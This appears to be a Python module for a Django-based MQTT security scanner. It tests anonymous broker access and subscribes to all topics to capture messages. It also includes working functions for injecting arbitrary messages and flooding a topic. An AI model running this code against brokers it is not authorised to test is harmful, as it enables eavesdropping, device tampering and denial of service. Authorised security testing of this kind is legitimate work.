import paho.mqtt.client as mqtt
import time
import threading
from .models import DiscoveredTopic, InterceptedMessage, TestResult

class MQTTSecurityScanner:
    def __init__(self, session):
        self.session = session
        self.client = mqtt.Client()
        self.connected = False
        
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            self.connected = True
            print(f"[+] Connected to {self.session.host}:{self.session.port}")
        else:
            print(f"[-] Connection failed: {rc}")
    
    def on_message(self, client, userdata, msg):
        topic = msg.topic
        payload = msg.payload.decode('utf-8', errors='ignore')
        
        # Save discovered topic
        DiscoveredTopic.objects.get_or_create(
            session=self.session,
            topic=topic
        )
        
        # Save intercepted message
        InterceptedMessage.objects.create(
            session=self.session,
            topic=topic,
            payload=payload
        )
    
    def run_scan(self):
        """Main scan function"""
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        
        try:
            # Test anonymous access
            self.client.connect(self.session.host, self.session.port, 60)
            self.client.loop_start()
            time.sleep(2)
            
            if self.connected:
                TestResult.objects.create(
                    session=self.session,
                    test_type='anonymous_access',
                    success=True,
                    details="Anonymous connection successful"
                )
                
                # Subscribe to wildcards for topic discovery
                wildcards = ['#', '+/+', '+/+/+', '$SYS/#']
                for wildcard in wildcards:
                    self.client.subscribe(wildcard)
                
                # Run discovery for specified duration
                time.sleep(self.session.duration)
                
                # Update session status
                self.session.status = 'completed'
                self.session.save()
                
            else:
                TestResult.objects.create(
                    session=self.session,
                    test_type='anonymous_access',
                    success=False,
                    details="Anonymous connection failed"
                )
                
        except Exception as e:
            TestResult.objects.create(
                session=self.session,
                test_type='connection_error',
                success=False,
                details=str(e)
            )
        
        finally:
            self.client.loop_stop()
            self.client.disconnect()
    
    def test_injection(self, topic, payload):
        """Test message injection"""
        try:
            if not self.connected:
                self.client.connect(self.session.host, self.session.port, 60)
                self.client.loop_start()
                time.sleep(1)
            
            self.client.publish(topic, payload)
            return True
        except Exception as e:
            print(f"Injection failed: {e}")
            return False
    
    def flood_attack(self, topic, count):
        """Perform flood attack"""
        try:
            if not self.connected:
                self.client.connect(self.session.host, self.session.port, 60)
                self.client.loop_start()
                time.sleep(1)
            
            for i in range(count):
                payload = f"flood_message_{i}_{time.time()}"
                self.client.publish(topic, payload)
                time.sleep(0.01)
            
            return True
        except Exception as e:
            print(f"Flood attack failed: {e}")
            return False